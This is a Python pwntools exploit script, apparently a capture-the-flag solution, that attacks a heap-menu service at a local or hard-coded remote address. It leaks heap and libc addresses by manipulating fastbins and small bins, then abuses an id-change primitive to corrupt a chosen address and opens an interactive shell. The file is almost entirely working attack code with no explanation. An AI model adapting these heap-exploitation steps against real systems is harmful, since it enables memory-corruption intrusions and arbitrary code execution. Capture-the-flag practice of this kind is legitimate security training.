from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "35.221.81.216"
    port = 30005
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(verbose=True):
    s = r.recv()
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil('>')
    sendline(str(choice))

# receive and send
def rs(r, s, new_line=True):
    recvuntil(r)
    if new_line:
        sendline(s)
    else:
        send(s)

def input_id(i):
    recvuntil('id > ')
    sendline(str(i))

def input_size(size):
    recvuntil('size > ')
    sendline(str(size))

def allocate(id, size):
    menu(0)
    input_id(id)
    input_size(size)

def extend(id, size):
    menu(1)
    input_id(id)
    input_size(size)


def change_id(id, new_id):
    menu(2)
    input_id(id)
    input_id(new_id)

def show(id):
    menu(3)
    input_id(id)
    recvuntil(': ')
    id = recvuntil(' ')
    recvuntil('size: ')
    size = recvuntil('\n')
    return int(id, 16), int(size, 16)

def deallocate(id):
    menu(4)
    input_id(id)

def write(id, content):
    menu(4)
    input_id(id)
    recvuntil('content: ')
    sendline(str(content))


victim = 0x404171 - 0x10
name = '\x00' * 0x19 + p64(victim + 0x10)[:6]
recvuntil('name > ')

sendline(name)
allocate(100, 0x50)
allocate(101, 0x50)



# 0x50 -> fastbin heap addr leak
for i in range(9):
    allocate(i, 0x50)
for i in range(3, 9):
    deallocate(i)
deallocate(1)
deallocate(0)
deallocate(2)

allocate(102, 0x50)

x, y = show(2)
print(hex(y))

heap_base = y - 0x350

N = 1000

for i in range(9):
    allocate(N + i, 0x90)
for i in range(3, 9):
    deallocate(N + i)
deallocate(N + 1)
deallocate(N + 0)
deallocate(N + 2)


# -> small bin libc addr leak
allocate(200, 0xa0)

target = heap_base + 0x7f0
print(hex(target))
_, arena = show(target)
arena_offset = 0x1ebc70
libc_base = arena - arena_offset
print(hex(libc_base))


allocate(201, 0x90)
allocate(202, 0x90)

free_hook_offset = 0x1eeb28

change_id(libc_base + arena_offset, victim)
wait_for_attach()
extend(100, 0x90)

menu(5)
interactive()

